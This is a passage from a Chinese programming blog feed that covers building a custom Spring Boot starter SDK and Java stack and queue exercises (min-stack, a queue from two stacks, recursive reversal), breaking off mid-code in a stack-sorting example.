<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    本文中，我大概总结了一下，Java操作Mysql的演化过程，从最基本的JDBC到自动化的ORM操作，可以看到操作是越来越简单，也越来越灵活了，但底层大致的原理我们还是应该了解的。</p>
<p>​    本文我参考了韩顺平老师的Mysql基础文章和小四的技术之旅文章。十分感谢！！！原作者的文章中的内容更加详细，具体可在网上查询。</p>
<p>​    这里想推一下我的博客，虽然现在还很简陋，里面会分享我的学习所得，也希望能帮助到大家，<a href="http://1.14.74.242/">http://1.14.74.242</a></p>
]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
      <tags>
        <tag>jdbc</tag>
        <tag>orm</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>封装自己的SDK</title>
    <url>//post/Spring/%E5%B0%81%E8%A3%85%E8%87%AA%E5%B7%B1%E7%9A%84SDK.html</url>
    <content><![CDATA[<h1 id="封装自己的SDK"><a href="#封装自己的SDK" class="headerlink" title="封装自己的SDK"></a>封装自己的SDK</h1><p>​    我们在开发Spring项目时常常会引入各种<code>xxx-spring-boot-starter</code>的依赖包，然后在配置文件中填入必要的信息，就可以使用依赖提供好的容器。这里是在鱼皮新项目直播中学习到的，特此记录一下。可在未来封装自己的SDK进行封装与装逼。</p>
<h2 id="SDK项目下"><a href="#SDK项目下" class="headerlink" title="SDK项目下"></a>SDK项目下</h2><ol>
<li>将pom.xml中的<build>标签删除</li>
</ol>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>定义我们需要的模型</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span>
<span class="token annotation punctuation">@AllArgsConstructor</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> sqlSessionFactory <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 获取连接
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"创建并返回数据库Connection"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>自动扫描并添加容器</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span>
<span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span><span class="token string">"sicheng.database"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Data</span>
<span class="token annotation punctuation">@ComponentScan</span>
<span class="token keyword">public</span> <span class="token keyword">class</span>  sqlSessionConfig<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> sqlSessionFactory <span class="token function">getSqlSessionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">sqlSessionFactory</span><span class="token punctuation">(</span>userName<span class="token punctuation">,</span>password<span class="token punctuation">,</span>driver<span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li>在resources资源下进行配置：META-INF包下的spring.factories文件</li>
</ol>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># spring boot starter  这里配置你注册容器类的引用，也就是第三步的类引用，会自动扫描并注入</span>
<span class="token key attr-name">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span><span class="token punctuation">=</span><span class="token value attr-value">com.example.sichengclientsdk.sqlSessionConfig</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="5">
<li>Maven进行install操作，在你的pom.xml中找到对应的依赖值</li>
</ol>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.sicheng<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>sicheng-client-sdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol start="6">
<li>在别的项目中进行引用，这里需要注意：maven的install只会创建在本地，如果远程使用，需要注册到Maven依赖库</li>
</ol>
<h2 id="需要依赖的项目"><a href="#需要依赖的项目" class="headerlink" title="需要依赖的项目"></a>需要依赖的项目</h2><ol>
<li>依赖引入</li>
</ol>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.sicheng<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>sicheng-client-sdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>在Resource中填入需要的值，这里注意我们需要在SDK环境中引入<code>spring-boot-configuration-processor</code>,这样当我们使用依赖后，可在<code>application.yml</code>中看到提示</li>
</ol>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-configuration-processor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">sicheng</span><span class="token punctuation">:</span>
  <span class="token key atrule">database</span><span class="token punctuation">:</span>
    <span class="token key atrule">driver</span><span class="token punctuation">:</span> com.mysql.cj.jdbc.Driver
    <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/sicheng
    <span class="token key atrule">username</span><span class="token punctuation">:</span> root
    <span class="token key atrule">password</span><span class="token punctuation">:</span> <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>自动注入容器并使用</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Resource</span>
sqlSessionConfig sqlSessionConfig<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Test</span>
<span class="token keyword">void</span> <span class="token function">testMySDK</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    sqlSessionFactory factory <span class="token operator">=</span> sqlSessionConfig<span class="token punctuation">.</span><span class="token function">getSqlSessionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    factory<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 输出：创建并返回数据库Connection</span>
    <span class="token comment">// 输出：sqlSessionFactory(userName=root, password=123456, driver=com.mysql.cj.jdbc.Driver, url=jdbc:mysql://localhost:3306/sicheng)</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>SDK</tag>
      </tags>
  </entry>
  <entry>
    <title>第一章：栈与队列</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97.html</url>
    <content><![CDATA[<h1 id="第一章：栈与队列"><a href="#第一章：栈与队列" class="headerlink" title="第一章：栈与队列"></a>第一章：栈与队列</h1><h2 id="设计一个有getMin功能的栈"><a href="#设计一个有getMin功能的栈" class="headerlink" title="设计一个有getMin功能的栈"></a>设计一个有getMin功能的栈</h2><blockquote>
<p>要求：pop，push，getMin的时间复杂度为：O(1)</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> stackTemplate <span class="token punctuation">&#123;</span>
    <span class="token comment">// 记录插入值</span>
    <span class="token keyword">private</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 记录插入值的最小值</span>
    <span class="token keyword">private</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> minStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 如果最小值栈的栈顶元素 大于 当前元素，则说明有新的最小值了，</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>minStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> minStack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            minStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"栈为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Integer</span> pop <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>pop <span class="token operator">&lt;=</span> minStack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            minStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> pop<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getMin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> minStack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="由两个栈组成的队列"><a href="#由两个栈组成的队列" class="headerlink" title="由两个栈组成的队列"></a>由两个栈组成的队列</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> myQueue <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> inStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> outStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> inStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> outStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        inStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"栈为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">pushToPop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> outStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">pushToPop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> outStack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">pushToPop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>outStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>inStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                outStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>inStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="如何仅用递归函数和栈操作逆序一个栈"><a href="#如何仅用递归函数和栈操作逆序一个栈" class="headerlink" title="如何仅用递归函数和栈操作逆序一个栈"></a>如何仅用递归函数和栈操作逆序一个栈</h2><blockquote>
<p>通过递归函数实现栈中元素的逆序，比如放入：1,2,3,4. 逆序后：4,3,2,1</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 递归逆序栈  其实底层利用了栈帧的局部变量表去存储临时变量</span>
<span class="token comment">// 1. 每次pop()，返回栈底元素</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAndRemoveLastElement</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Integer</span> pop <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> pop<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> lastElement <span class="token operator">=</span> <span class="token function">getAndRemoveLastElement</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> lastElement<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 2. 逆序栈</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 如果为空，说明已经到底了，栈内没元素了</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 我们可以理解为，每次我就去取栈底的值，</span>
    <span class="token keyword">int</span> element <span class="token operator">=</span> <span class="token function">getAndRemoveLastElement</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 剩下的每一次递归都会去取栈底元素，直到为空</span>
    <span class="token function">reverse</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将栈底元素放到栈顶</span>
    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="用一个栈实现另一个栈的排序"><a href="#用一个栈实现另一个栈的排序" class="headerlink" title="用一个栈实现另一个栈的排序"></a>用一个栈实现另一个栈的排序</h2><p>方法1（利用栈帧）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> helpStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>helpStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> helpStack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        helpStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">Integer</span> pop <span class="token operator">=</span> helpStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">reverse</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    helpStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reverseByStack</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 将stack内所有元素有序放入helpStack，所有元素访问后，helpStack有序，则导入stack，保证stack有序</span>
